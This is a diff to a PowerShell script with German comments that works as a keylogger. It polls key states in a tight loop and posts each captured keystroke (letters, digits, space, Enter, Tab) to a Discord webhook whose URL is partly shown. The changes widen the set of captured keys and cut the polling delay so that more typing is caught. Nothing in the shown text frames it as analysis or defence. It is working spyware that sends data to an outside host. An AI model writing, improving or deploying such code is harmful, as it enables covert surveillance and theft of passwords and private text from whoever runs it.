@@ -15,6 +15,11 @@ $hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyys
 $start = Get-Date
 $timeout = 120 # Sekunden
 
+# Virtual Key Codes für spezielle Tasten
+$VK_SPACE = 0x20  # Leerzeichen
+$VK_RETURN = 0x0D # Enter
+$VK_TAB = 0x09    # Tab
+
 # Logger-Start an Discord melden
 try {
     Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
@@ -25,15 +30,42 @@ while ($true) {
     if ($elapsed.TotalSeconds -ge $timeout) {
         break
     }
-    foreach ($char in 32..126) {
-        if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
+
+    # Prüfe spezielle Tasten
+    if ([Keyboard]::GetAsyncKeyState($VK_SPACE) -eq -32767) {
+        try {
+            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=" "}|ConvertTo-Json) -ContentType "application/json"
+        } catch {}
+    }
+    if ([Keyboard]::GetAsyncKeyState($VK_RETURN) -eq -32767) {
+        try {
+            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="\n"}|ConvertTo-Json) -ContentType "application/json"
+        } catch {}
+    }
+    if ([Keyboard]::GetAsyncKeyState($VK_TAB) -eq -32767) {
+        try {
+            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="\t"}|ConvertTo-Json) -ContentType "application/json"
+        } catch {}
+    }
+
+    # Prüfe alle Standard-ASCII Zeichen
+    foreach ($vkey in 65..90) {  # A-Z
+        if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
+            $char = [char]$vkey
             try {
-                # Sende Tastendruck sofort an Discord
-                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=[char]$char}|ConvertTo-Json) -ContentType "application/json"
+                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$char}|ConvertTo-Json) -ContentType "application/json"
+                Write-Host "Taste gedrückt: $char" # Debug-Ausgabe
             } catch {}
         }
     }
-    Start-Sleep -Milliseconds 40
+    foreach ($vkey in 48..57) {  # 0-9
+        if ([Keyboard]::GetAsyncKeyState($vkey) -eq -32767) {
+            try {
+                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=[char]$vkey}|ConvertTo-Json) -ContentType "application/json"
+            } catch {}
+        }
+    }
+    Start-Sleep -Milliseconds 1  # Kürzere Verzögerung für besseres Ansprechverhalten
 }
 
 # Logger-Ende an Discord melden
